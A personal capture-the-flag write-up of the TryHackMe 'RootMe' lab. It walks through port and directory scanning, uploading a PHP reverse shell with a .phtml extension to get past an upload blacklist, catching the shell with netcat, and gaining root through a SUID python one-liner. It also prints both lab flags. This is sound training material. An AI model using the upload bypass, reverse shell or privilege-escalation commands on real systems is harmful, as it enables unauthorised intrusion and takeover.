---
title: "THM: RootMe"
date: 2023-12-21 20:59:56
categories: TryHackMe
tags:
  - TryHackMe
  - Reverse Shell
  - Privilege Escalation 
---

# Introduction

 This is a writeup for the room [RootMe](https://tryhackme.com/room/rrootme) on [TryHackMe](https://tryhackme.com/).

It was a rather simple room, but I definitely learnt a few things like php, reverse shells, and privilege escalation techniques. I also struggled a little... which were the fun parts LOL

# Pre-Enumeration

On the first look, we are greeted with this page.
![RootMe](./img/rootme/rootme.png)

There wasn't much to see, so I used inspect element to see if there was anything interesting.

![RootMe](./img/rootme/inspect.png)

Unfortunately, everything seemed normal. So I moved on to the next step.

# Reconnaissance

Questions:

1. Scan the machine, how many ports are open?
2. What version of Apache is running?
3. What service is running on port 22?
4. Find directories on the web server using the GoBuster tool.
5. What is the hidden directory?

## Nmap

I ran a nmap scan on the machine to see what ports were open with:

```bash
nmap -sC -sV -oN nmap/initial <ip>
```

This means that I am using:

- `-sC` to run default nmap scripts
- `-sV` to run version detection on open ports
- `-oN` to output the results in normal format to the file `nmap/initial`
- `<ip>` is the ip address of the machine

The results were:

```
# Nmap 7.93 scan initiated Thu Dec 21 20:18:54 2023 as: nmap -sC -sV -oN nmap/initial <ip>

Nmap scan report for <ip>
Host is up (0.33s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 4ab9160884c25448ba5cfd3f225f2214 (RSA)
| 256 a9a686e8ec96c3f003cd16d54973d082 (ECDSA)
|_ 256 22f6b5a654d9787c26035a95f3f9dfcd (ED25519)
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
|\_http-server-header: Apache/2.4.29 (Ubuntu)
| http-cookie-flags:
| /:
| PHPSESSID:
|_ httponly flag not set
|\_http-title: HackIT - Home
512/tcp filtered exec
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Thu Dec 21 20:19:43 2023 -- 1 IP address (1 host up) scanned in 49.29 seconds
```

The nmap scan shows that there are **2** open ports, 22 running **ssh** and 80 running http with **Apache 2.4.29**.

## GoBuster

Next, I ran a gobuster scan to find directories on the web server with a wordlist from a GitHub [repo](https://github.com/gmelodie/awesome-wordlists).

```bash
gobuster dir -u <ip> -w ../Documents/Tools/wordlists/directory-list-2.3-medium.txt
```

After running it for a bit, I got a few results:

```
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url: http://<ip>
[+] Method: GET
[+] Threads: 10
[+] Wordlist: ../Documents/Tools/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes: 404
[+] User Agent: gobuster/3.6
[+] Timeout: 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads (Status: 301) [Size: 316][--> http://<ip>/uploads/]
/css (Status: 301) [Size: 312][--> http://<ip>/css/]
/js (Status: 301) [Size: 311][--> http://<ip>/js/]
/panel (Status: 301) [Size: 314][--> http://<ip>/panel/]
```

`/uploads` and `/panel` looked interesting. On TryHackMe's answer blank, it had `/*****/`, so the answer was just `/panel/`.

I first checked out the `/panel` directory, and it was a file upload page.
![RootMe](./img/rootme/panel.png)

I tested the file upload with a random image file, and it gave this success message.
![RootMe](./img/rootme/success.png)

Next, I checked out the `/uploads` directory, which shows the uploaded files, and the image I uploaded was there.
![RootMe](./img/rootme/uploads.png)

Okay, so the file upload works as intended, so we can move on to the next step.

# Getting a Shell

Question:

1. Find a form to upload and get a reverse shell, and find the flag.
   > user.txt

## Reverse Shell

I found a php reverse shell script from [GitHub](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) and modified the ip address to my host machine's.

```php
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
```

Next, I started a netcat listener on my host machine with:

```bash
nc -lvnp 1234
```

- `-l` is to listen for incoming connections
- `-v` is to show verbose output
- `-n` is to not resolve hostnames
- `-p` is to specify the port to listen on

Then, I uploaded the php reverse shell script to the web server with the file upload page. But... it gave an error!

![RootMe](./img/rootme/phpupload.png)

So it seems that PHP files are not allowed. I then searched the web for a way to bypass this blacklist, and found an article from [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-upload).

There are certain PHP extensions that can be used to bypass the blacklist:

> PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module
> Working in PHPv8: .php, .php4, .php5, .phtml, .module, .inc, .hphp, .ctp

I then used the `.phtml` extension, and it did bypass the blacklist. The next step was to execute the script. I clicked the `Veja!` button which brought me to the file in the `/uploads` directory.

Then, I got a connection on the netcat listener!
![RootMe](./img/rootme/connected.png)

## Getting the Flag

Alright, now that I have access to the shell, it's time to look for the `user.txt` flag. I used the `find` command to search for the file.

```bash
$ find / -name user.txt 2>/dev/null
/var/www/user.txt
```

- `2>/dev/null` redirects the errors so that it doesn't show up in the terminal

To get the flag:

```bash
$ cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
```

# Privilege Escalation

Questions:
Now that we have a shell, let's escalate our privileges to root.

1. Search for files with SUID permission, which file is weird?
2. Find a form to escalate your privileges.
3. root.txt

## SUID Files

In order to find files with said permissions, I also used the `find` command.

```bash
$ find / -type f -user root -perm -4000 2>/dev/null
```

![RootMe](./img/rootme/suid.png)

There were a bunch of files, and I had to compare them with my own host machine... Anyway, it was a little odd that `/usr/bin/python` was in the list.

## Escalating Privileges

I searched up ways to escalate privileges with python and found a website from [GTFOBins](https://gtfobins.github.io/gtfobins/python/#suid).

![RootMe](./img/rootme/gtfobins.png)

Since it already had SUID permissions, I could negate the first command.

```bash
$ /bin/bash
python -c 'import pty;pty.spawn("/bin/bash")'
bash-4.4$  python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
#
```

Essentially, this command first spawns a new bash shell. Then, it spawns a pseudo-terminal which allows me to stablise the shell, which allows me to use commands like `clear` and `Ctrl+C`, for simplicity.

Finally for the most important command, it, within the spawned Bash shell, uses Python to replace the current process with a new shell, which is `/bin/sh` with the `-p` flag, which makes it a privileged shell.

Seeing the `#` symbol in the terminal showed that I successfully gained root access!

## Getting the Flag (Again)

Now, let's get the `root.txt` flag. Once again, I had to locate the file.

```bash
# find / -name root.txt 2>/dev/null
```

The flag was in `/root/root.txt`.

```bash
# cat /root/root.txt
cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```

Wahoo! We got the flag :)

# Conclusion

This was an interesting and beginner-friendly room, with lots of learning points. I learnt about the various exploits that can be used for bypassing file upload restrictions, and exploiting SUID files. Pretty cool!
